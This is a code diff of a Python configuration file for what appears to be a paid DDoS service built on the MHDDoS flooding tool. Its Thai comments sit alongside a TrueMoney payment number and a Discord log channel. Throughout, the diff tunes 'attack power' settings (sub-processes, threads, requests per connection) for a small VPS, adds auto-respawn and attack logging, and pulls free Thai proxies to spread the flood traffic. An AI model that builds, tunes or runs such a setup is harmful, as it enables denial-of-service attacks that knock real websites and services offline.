@@ -13,31 +13,39 @@ LOG_CHANNEL_ID = 1557064238940299376
 TRUEMONEY_PHONE = "0837751528"
 TRUEMONEY_API_KEY = os.getenv("TM_API_KEY", "")
 
-# MHDDoS — absolute path
+# MHDDoS
 MHDDOS_PATH = os.getenv("MHDDOS_PATH", "start.py")
 MHDDOS_FULL = os.path.join(BASE_DIR, MHDDOS_PATH)
 MHDDOS_DIR  = os.path.dirname(MHDDOS_FULL)
+MHDDOS_LAUNCHER = os.path.join(BASE_DIR, "mhddos_launcher.py")
 
-# ── Attack power ──
-SUB_NODES_PER_DEVICE = 5      # 1 device → 5 sub-process
-THREADS_PER_SUB_NODE = 500    # ต่อ sub-process
-RPC_PER_SUB_NODE     = 128    # requests per connection
+# ── Attack power (ปรับสำหรับ VPS 2GB RAM) ──
+SUB_NODES_PER_DEVICE = 3        # 1 device → 3 sub-process
+THREADS_PER_SUB_NODE = 300      # ต่อ sub-process
+RPC_PER_SUB_NODE     = 200      # requests per connection (reuse สูง)
+STACK_SIZE_BYTES     = 512 * 1024  # 512KB stack ต่อ thread (default 8MB)
+
+# ── Auto-respawn ──
+MAX_RESPAWN_ATTEMPTS = 3
+RESPAWN_DELAY        = 2        # วินาที
+
+# ── Attack log ──
+ATTACK_LOG_DIR = os.path.join(BASE_DIR, "data", "attack_logs")
 
 # ── Proxy ──
 PROXY_SOURCES = [
     "https://proxy5.net/th/free-proxy/thailand/socks5",
     "https://proxy5.net/th/free-proxy/thailand/http",
 ]
-PROXY_FETCH_TIMEOUT  = 45     # ยาวขึ้น — รอ source ตอบ
-PROXY_VALIDATE_TIMEOUT = 5
+PROXY_FETCH_TIMEOUT        = 45
+PROXY_VALIDATE_TIMEOUT     = 5
 PROXY_VALIDATE_CONCURRENCY = 150
-PROXY_UPDATE_INTERVAL = 600   # refresh ทุก 10 นาที
-PROXY_CACHE_FILE = os.path.join(BASE_DIR, "data", "proxies_cache.txt")
-PROXIES_PER_SUB_NODE = 20     # เป้า — proxy ต่อ 1 sub-node
+PROXY_UPDATE_INTERVAL      = 600
+PROXY_CACHE_FILE           = os.path.join(BASE_DIR, "data", "proxies_cache.txt")
+PROXIES_PER_SUB_NODE       = 20
 
 
 def proxy_slice_file(user_id: int, index: int) -> str:
-    """ไฟล์ proxy แยกต่อ (user, sub-node)"""
     return os.path.join(BASE_DIR, "data", f"px_{user_id}_{index}.txt")
 
 
